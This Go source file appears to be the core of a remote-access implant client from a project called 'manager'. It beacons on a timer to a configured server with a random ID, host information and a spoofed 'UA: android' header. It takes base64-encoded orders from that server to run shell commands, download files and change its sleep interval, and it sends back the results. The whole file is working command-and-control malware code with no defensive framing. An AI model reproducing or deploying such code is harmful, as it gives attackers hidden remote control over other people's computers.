package core

import (
	"github.com/9bie/manager/Client/config"
	"github.com/9bie/manager/Client/shell"
	"github.com/9bie/manager/Client/utils"
	"bytes"
	"encoding/base64"
	"encoding/json"

	"io/ioutil"
	//"log"
	"net/http"
	"strings"
	"time"
)

type Event struct { // 本地事件
	Action string `json:"action"`
	Data   string `json:"data"`
}

type Heartbeat struct { //心跳包
	Uuid       string            `json:"uuid"`
	Result     []Event           `json:"result"`
	Info       utils.Information `json:"info"`
	Sleep int                    `json:"sleep"`
}
type Action struct {// 服务器下发的包
	Do   string `json:"do"`
	Data string `json:"data"`
}

type Core struct {
	remoteAddress string
	info          utils.Information
	sleep         int
	uuid          string
	event         []Event
}

func (c *Core) RefreshInfo() {
	c.info = utils.GetInformation()
}
func (c *Core) Pool() {
	client := &http.Client{}
	for {
		time.Sleep(time.Duration(c.sleep) * time.Second)
		
		data := Heartbeat{Uuid: c.uuid, Result: c.event, Info: c.info, Sleep: c.sleep}
		c.event = nil
		bytesJson, err := json.Marshal(data)
		if err != nil {
			continue
		}
		
		req, err := http.NewRequest("POST", c.remoteAddress, bytes.NewReader(bytesJson))
		if err != nil {
			continue
		}
		req.Header.Add("UA", "android")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			continue
		}


		var action []Action

		err = json.Unmarshal(body, &action)
		if err != nil {

			
		}
		for _, i := range action {

			switch i.Do {
			case "cmd":

				cmdData, err := base64.StdEncoding.DecodeString(i.Data)
				if err != nil {
					c.event = append(c.event, Event{Action: "cmd", Data: err.Error()})
					break
				}

				var cmd shell.Shell
				err = json.Unmarshal(cmdData, &cmd)
				if err != nil {

					c.event = append(c.event, Event{Action: "cmd", Data: err.Error()})
					break
				}
				go func() {
					c.event = append(c.event, Event{Action: "cmd", Data: cmd.ExecuteCmd()})
				}()

			case "download":
				var down shell.Down
				downData, err := base64.StdEncoding.DecodeString(i.Data)
				if err != nil {
					c.event = append(c.event, Event{Action: "download", Data: err.Error()})
					break
				}
				err = json.Unmarshal([]byte(downData), &down)
				if err != nil {
					c.event = append(c.event, Event{Action: "download", Data: err.Error()})
				}
				go func() {
					c.event = append(c.event, Event{Action: "download", Data: down.Download()})
				}()

			case "remark":
				var remark shell.Remark
				remarkData, err := base64.StdEncoding.DecodeString(i.Data)
				if err != nil {
					c.event = append(c.event, Event{Action: "remark", Data: err.Error()})
					break
				}
				err = json.Unmarshal([]byte(remarkData), &remark)
				if err != nil {
					c.event = append(c.event, Event{Action: "remark", Data: err.Error()})
				}
				go func() {
					c.info.Remarks = remark.Remark
					c.event = append(c.event, Event{Action: "remark", Data: "Change Remark Successful."})
				}()
			case "sleep":
				var sleep shell.Sleep
				sleepData, err := base64.StdEncoding.DecodeString(i.Data)
				if err != nil {
					c.event = append(c.event, Event{Action: "sleep", Data: err.Error()})
					break
				}
				err = json.Unmarshal([]byte(sleepData), &sleep)
				if err != nil {
					c.event = append(c.event, Event{Action: "sleep", Data: err.Error()})
				}
				go func() {
					c.sleep = sleep.Sleep
					c.event = append(c.event, Event{Action: "sleep", Data: "Change Sleep Successful."})
				}()

				
				
			}
		}
	}
}

func NewClient() Core {
	var u string
	
	u = utils.RandStringRunes(16)
	
	//fmt.Println("Target", strings.TrimSpace(config.RemoteAddress))
	c := Core{
		remoteAddress: strings.TrimSpace(config.RemoteAddress),
		info:          utils.GetInformation(),
		uuid:          u,
		sleep:         config.DefaultSleep,
	}
	return c
}
